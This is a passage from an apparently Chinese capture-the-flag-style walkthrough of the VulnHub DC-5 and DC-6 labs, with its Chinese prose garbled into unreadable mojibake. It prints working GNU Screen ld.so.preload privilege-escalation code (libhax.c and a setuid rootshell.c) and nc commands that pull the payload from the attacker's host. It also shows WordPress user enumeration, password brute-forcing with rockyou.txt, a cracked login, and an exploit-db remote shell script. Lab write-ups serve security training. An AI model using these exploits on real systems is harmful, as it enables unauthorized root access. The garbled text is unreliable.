src="/2022/08/29/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></p><p>ã€è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ˜¯æ­£å¸¸çš„ï¼Œä¸å½±å“ç¼–è¯‘åäº§ç”Ÿçš„æ–‡ä»¶çš„æ‰§è¡Œã€‘</p><p>æ‰§è¡Œå</p><blockquote><p><code>libhax.so  rootshell</code><br>è¿™ä¸¤ä¸ªæ–‡ä»¶å°±ç”Ÿæˆäº†</p></blockquote><p>ç„¶åæˆ‘ä»¬çš„<code>flag.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></p><h4 id="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"><a href="#2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶" class="headerlink" title="2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶"></a>2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</h4><p><code>å½“ç„¶å¦‚æœä½ ç”¨èšå‰‘è¿æ¥çš„shellçš„è¯ï¼Œç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›å»å°±è¡Œï¼Œç®€å•ä¸€ç‚¹</code></p><p>å¦‚æœç”¨ncçš„è¯å½“ç„¶ä¹Ÿä¸éš¾</p><p>å…ˆæ˜¯<code>kali</code>æœºæ§åˆ¶å°ã€ç›®å‰çŠ¶æ€ä¸º<code>/tmp</code>ä¸‹ã€‘</p><blockquote><p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; è¡¨ç¤ºä¼ å…¥</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></p><p>é¶æœº<code>shell</code>ã€å¿…é¡»åœ¨<code>/tmp</code>ç›®å½•ä¸‹æ‰èƒ½æ‰§è¡Œncã€‘</p><blockquote><p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;è¡¨ç¤ºä¼ å‡ºæ¥æ”¶æ–‡ä»¶,192.168.133.140ä¸ºkaliæœºip</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></p><p>çœ‹åˆ°ä¼ å…¥æˆåŠŸ</p><p><code>rootshell</code>å’Œ<code>flag.sh</code>æ–‡ä»¶ç±»ä¼¼ï¼Œä¸å†å±•ç¤º</p><p>æœ€åæˆåŠŸä¼ å…¥</p><p><img src="/2022/08/29/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></p><h4 id="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"><a href="#3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ" class="headerlink" title="3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ"></a>3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</h4><hr><p>ä¼ å…¥å®Œæˆåï¼Œç»™<code>flag.sh</code>åŠ ä¸Šæ‰§è¡Œæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure><hr><h5 id="å‡ºç°æ„å¤–"><a href="#å‡ºç°æ„å¤–" class="headerlink" title="*å‡ºç°æ„å¤–"></a>*<strong>å‡ºç°æ„å¤–</strong></h5><p><img src="/2022/08/29/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></p><p>ä¸çŸ¥é“æœ‰æ²¡æœ‰æœ‹å‹ä¹Ÿé‡åˆ°è¿™ç§æŠ¥é”™</p><p>æœ€åä¸€æ­¥æ‰§è¡Œ<code>rootshell</code>çš„æ—¶å€™ï¼Œå¼¹å‡ºè¿™ä¸ªå‘½ä»¤ï¼Œæˆ‘æœç´¢äº†ä¸€ä¸‹ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯cè¯­è¨€è„šæœ¬å†™é”™äº†ï¼Œä½†æ˜¯ä»”ç»†æ£€æŸ¥å¹¶æ²¡æœ‰å‡ºé”™</p><p>ç„¶åæˆ‘ä»¬çœ‹äº†çœ‹æˆ‘ä»¬çš„<code>kali</code>å’Œ<code>é¶æœº</code>çš„gccç‰ˆæœ¬</p><p>å‘ç°</p><blockquote><p>kaliæœºæ˜¯ï¼š<code>11.3.0-1</code></p><p>é¶æœºæ˜¯ï¼š<code>4.9.2</code></p></blockquote><p>ä½†æ˜¯ç¼–è¯‘å™¨ä¸åŒå¯¹ç»“æœåº”è¯¥æ²¡ä»€ä¹ˆå¤ªå¤§å½±å“</p><p>ä½†æˆ‘è¿˜æ˜¯è¯•è¯•èƒ½ä¸èƒ½åœ¨<code>é¶æœºçš„shell</code>é‡Œæ‰§è¡Œgccï¼Œè¿è¡Œä¸¤ä¸ªcè¯­è¨€è„šæœ¬æ–‡ä»¶ï¼Œå¾—åˆ°<code>rootshell</code>å’Œ<code>libhax.so</code>æ–‡ä»¶</p><p>ä½†æ˜¯åˆå‡ºç°</p><p><img src="/2022/08/29/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></p><p>åŸæ¥æ˜¯ç¼ºå°‘ç¯å¢ƒå˜é‡ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œ</p><h6 id="ç»™cc1é…ç½®ç¯å¢ƒå˜é‡"><a href="#ç»™cc1é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="ç»™cc1é…ç½®ç¯å¢ƒå˜é‡"></a>ç»™<code>cc1</code>é…ç½®ç¯å¢ƒå˜é‡</h6><p><img src="/2022/08/29/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä»ç®€ï¼Œç›´æ¥åœ¨é¶æœº<code>shell</code>æ‰§è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="/2022/08/29/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></p><h6 id="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"><a href="#å…³é”®æ¥äº†ã€æœŸå¾…ã€‘" class="headerlink" title="å…³é”®æ¥äº†ã€æœŸå¾…ã€‘"></a>å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</h6><p>æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„<code>flag.sh</code>è„šæœ¬ã€è¿™é‡Œæ˜¯é‡å¤çš„<code>flag.sh</code>ï¼Œæ‰€ä»¥åå­—ä¸º<code>flag.sh.1</code>ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></p><hr><p>ç»ˆäºè§£å†³é—®é¢˜åã€å¡äº†ä¸€å¤©äº†ã€‘</p><p>ç»ˆäºæˆåŠŸææƒ</p><p><img src="/2022/08/29/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></p><p>åˆ°<code>/root</code>ç›®å½•ä¸‹</p><p>æ‹¿åˆ°<code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></p><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure><p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p><p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p><p>ç¿»è¯‘ï¼š                                                                                      </p><p>å†æ¬¡éå¸¸æ„Ÿè°¢æ‰€æœ‰å®Œæˆè¿™äº›å°æŒ‘æˆ˜çš„äººï¼Œ<br>å°¤å…¶æ˜¯æ‰€æœ‰ç»™æˆ‘åé¦ˆçš„äººâ€”â€”å†ä¸€æ¬¡ï¼Œè¿™ä¸€åˆ‡éƒ½å¾ˆæ£’<br>èµèµã€‚ :-)</p><p>æˆ‘è¿˜è¦éå¸¸æ„Ÿè°¢æ‰€æœ‰å‘ç°æ¼æ´çš„äºº<br>å¹¶åˆ›é€ ä½¿è¿™äº›æŒ‘æˆ˜æˆä¸ºå¯èƒ½çš„æ¼æ´ã€‚</p></blockquote><p><code>åè¡€äº†ï¼Œæœç„¶æ˜¯ä¸­çº§ï¼Œé¡ºä¾¿æé†’ä¸€ä¸‹å¤§å®¶ï¼Œéå¿…è¦ä¸è¦æ›´æ–°</code></p><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p><hr><h1 id="å…­ã€DC-6-ä¸­çº§"><a href="#å…­ã€DC-6-ä¸­çº§" class="headerlink" title="å…­ã€DC-6[ä¸­çº§]"></a>å…­ã€DC-6[ä¸­çº§]</h1><p><strong>only one flag</strong></p><h2 id="ä¿¡æ¯æ”¶é›†-5"><a href="#ä¿¡æ¯æ”¶é›†-5" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆæŠ¬æ‰‹<code>nmap</code>æ‰«æä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></p><blockquote><p>å‘ç°<br><code>22</code>ç«¯å£ï¼šè¿è¡Œç€<code>ssh</code>ã€é»˜è®¤ç«¯å£ã€‘<br><code>80</code>ç«¯å£ï¼šè¿è¡Œç€<code>http</code>ã€é»˜è®¤ç«¯å£ã€‘</p></blockquote><p>çœ‹æ¥å¯èƒ½æ˜¯éœ€è¦<code>ssh</code>è¿æ¥æ‹¿<code>shell</code></p><hr><p>è¿™ä¸ªé¶æœºå¥½åƒéœ€è¦é…ç½®<code>hosts</code>æ–‡ä»¶ï¼Œä¸ç„¶é€šè¿‡<code>ip</code>æ˜¯è®¿é—®ä¸äº†ç½‘ç«™çš„</p><p><img src="/2022/08/29/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></p><p>ç„¶åè®¿é—®è¯•è¯•</p><p>å¥½äº†ã€ä½†æ˜¯å¥½åƒæœ‰ç‚¹å¡ã€‘</p><p>ç•Œé¢å’Œ<code>DC2</code>ä¸€æ ·ã€æ¢¦å›<code>DC2</code>ï¼Œæ“ä½œåº”è¯¥å·®ä¸å¤šã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></p><hr><p>ä¹ æƒ¯çœ‹çœ‹<code>wappalyzer</code></p><p><img src="/2022/08/29/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></p><p>çœ‹åˆ°<code>CMS</code>æ˜¯<code>WordPress 5.1.1</code></p><p>æƒ³åˆ°å¯ä»¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‹¿åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯</p><hr><p>æˆ‘ä»¬å†çœ‹çœ‹ç½‘ç«™ä¸Šæœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯</p><p><code>about us</code>é‡Œä¼¼ä¹å…¨æ˜¯æ–‡æœ¬å†…å®¹æ²¡å•¥æç¤º</p><p>çœ‹åˆ°æœ‰ä¸ª<code>concact us</code>ï¼Œå¯èƒ½æœ‰äº¤äº’åˆ©ç”¨çš„åœ°æ–¹</p><p><img src="/2022/08/29/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></p><p>è™½ç„¶çœ‹èµ·æ¥æ²¡æœ‰ä½†æ˜¯å…¶å®æ˜¯æœ‰çš„</p><p>é€šè¿‡<code>concact us</code>é¡µé¢çš„urlï¼Œåœ¨åé¢åŠ ä¸Šç”¨æˆ·çš„åå­—å°±å¯ä»¥</p><blockquote><p><code>http://xxx/admin</code>  </p><p>&#x2F;&#x2F;å½“ç„¶å…¶å®å¹¶ä¸å¤ªé‡è¦ï¼Œä¸è¿‡å¯ä»¥è¯•è¯•çœ‹ï¼Œèƒ½ä¸èƒ½ç•™è¨€xssç„¶åæŒŸæŒç®¡ç†å‘˜è´¦æˆ·ï¼Œä¸è¿‡è¿™å¹¶ä¸æ˜¯å®é™…æƒ…å†µï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±ç•™è¨€ï¼Œç„¶åç™»å½•çœ‹çœ‹</p></blockquote><hr><h2 id="1-wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘"><a href="#1-wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘" class="headerlink" title="1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘"></a>1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘</h2><p>çœ‹åˆ°<code>wordpress</code>å…ˆç”¨<code>wpscan</code>æä¸€ä¸‹</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></p><p>å¾—åˆ°ç”¨æˆ·å</p><blockquote><p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p></blockquote><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>user.txt</code></p><p>å“ªåœ¨å“ªé‡Œç™»å½•å‘¢ï¼Ÿæˆ‘ä»¬åœ¨å¼€å§‹é¡µé¢å¹¶æ²¡æœ‰çœ‹åˆ°ç™»å½•çª—å£</p><p>æˆ‘ä»¬ç”¨<code>dirb</code>æ‰«ä¸€ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span>wordy</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></p><hr><h2 id="2-wpscançˆ†ç ´å¯†ç "><a href="#2-wpscançˆ†ç ´å¯†ç " class="headerlink" title="2.wpscançˆ†ç ´å¯†ç "></a>2.wpscançˆ†ç ´å¯†ç </h2><p>æˆ‘ä»¬å†æ‰¾ä¸€ä¸ªå¯†ç è¡¨ï¼Œè¿™é‡Œç”¨å’Œ<code>DC2</code> <code>cewl</code>å‘½ä»¤çˆ¬ä¸€ä¸‹ç½‘ç«™ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨å…¶ä¸­æœ‰æ²¡æœ‰å¯†ç </p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¾—åˆ°ä¸€ä¸ªå¯†ç ã€æ“¦ï¼Œéš¾é“å’Œ<code>dc2</code>ä¸€æ ·çš„ã€‘</p><p>ç„¶åæˆ‘ä»¬å¼€å§‹è¿›è¡Œçˆ†ç ´ç™»å½•ã€æ³¨æ„éœ€è¦<code>root</code>æƒé™ã€‘</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></p><p>ç»“æœè‚¯å®šæ˜¯ä¸è¡Œçš„ã€è‚¯å®šä¸å’Œ<code>DC2</code>ä¸€æ ·ã€‘</p><p>&#x3D;&#x3D;&gt;</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ª<strong>å®Œæ•´çš„å¯†ç å­—å…¸</strong></p><blockquote><p>éœ€è¦ç”¨åˆ°<code>wordpress</code>çš„å¯†ç å­—å…¸ï¼Œkaliè‡ªå¸¦<code>rockyou.txt</code></p></blockquote><p>ç”±ä½œè€…æç¤ºå¾—ã€ä¹Ÿå°±æ˜¯æŠŠå¯†ç ä¸€éƒ¨åˆ†å‘Šè¯‰ä½ äº†ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></p><blockquote><p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p><p>&#x2F;&#x2F;-tæ˜¯æ·»åŠ çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯5ï¼Œå¤šåŠ å‡ ä¸ªå¯ä»¥æ›´å¿«ä¸€äº›</p></blockquote><p>å¦‚æœç›´æ¥è·‘çš„æœ‰ç‚¹ä¹…äº†</p><p><code>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€ç¡äº†ä¸€æ™šä¸Šï¼Œä¸çŸ¥é“å¥½ä¹…è·‘å‡ºæ¥çš„ã€‘</code></p><p><code>ã€ä¸ƒåƒä¸‡å¯†ç ã€‘</code></p><p><img src="/2022/08/29/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></p><p>æœ€åå¾—åˆ°</p><p><img src="/2022/08/29/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></p><blockquote><p>username:<code>mark</code><br>password:<code>helpdesk01</code></p></blockquote><p>è™½ç„¶åªæœ‰ä¸€ä¸ªç”¨æˆ·ä½†æ˜¯å¤Ÿäº†</p><hr><h2 id="3-ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯"><a href="#3-ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯" class="headerlink" title="3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯"></a>3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯</h2><p>ç™»å½•åå‘ç°æ˜¯ä¸€ä¸ª<code>wordpress</code>çš„åå°ç½‘ç«™</p><p><img src="/2022/08/29/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></p><p>åœ¨å·¦ä¾§æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿å«åš</p><p><code>Activity monitor</code></p><blockquote><p>æ˜¯ä¸€æ¬¾ç½‘ç«™ç”¨æˆ·æ´»åŠ¨ç›‘æ§æ’ä»¶ï¼Œæˆ‘ä»¬ç”¨æˆ·ç™»å½•çš„ipå’Œå…¶ä»–ä¿¡æ¯éƒ½ä¼šè¢«ç›‘æ§</p><p>&#x2F;&#x2F;é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¯•è¯•æ‰¾æ‰¾è¿™ä¸ªæ’ä»¶æœ‰æ²¡æœ‰æ¼æ´ï¼Œä»è€Œé€šè¿‡è¿™ä¸ªæ¼æ´æ‹¿åˆ°shellæˆ–è€…å…¶ä»–æ›´é«˜æƒé™ç”¨æˆ·çš„ä¿¡æ¯</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></p><p><img src="/2022/08/29/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></p><p>æˆ‘ä»¬æŸ¥ä¸€ä¸‹</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></p><p>å‘ç°æœç„¶æ˜¯æœ‰çš„ï¼Œåªæ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½åˆ©ç”¨</p><p>æˆ‘ä»¬ä¸»è¦æ‰¾åé¢ä¸¤ä¸ªå’Œ<code>wordpress</code>ç›¸å…³çš„</p><blockquote><p><code>45274.html</code>æ˜¯å‘½ä»¤æ³¨å…¥<br><code>50110.py</code>æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p></blockquote><h3 id="1ï¼‰50110-pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘"><a href="#1ï¼‰50110-pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘" class="headerlink" title="1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘"></a>1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘</h3><p>æ„Ÿè§‰<code>py</code>æ›´æ–¹ä¾¿ä¸€äº›ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹å†…å®¹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></p><p>çœ‹æ¥åªéœ€è¦<code>ip</code>ï¼Œä»¥åŠ<code>ç”¨æˆ·å</code>å’Œ<code>å¯†ç </code>å³å¯è¿›å…¥<code>shell</code></p><p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘æŒ‰æˆ‘çš„è¾“å…¥</p><blockquote><p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></p><p>è¿›å…¥<code>shell</code></p><hr><p>ç„¶åå›ºå®šå§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼<code>shell</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span 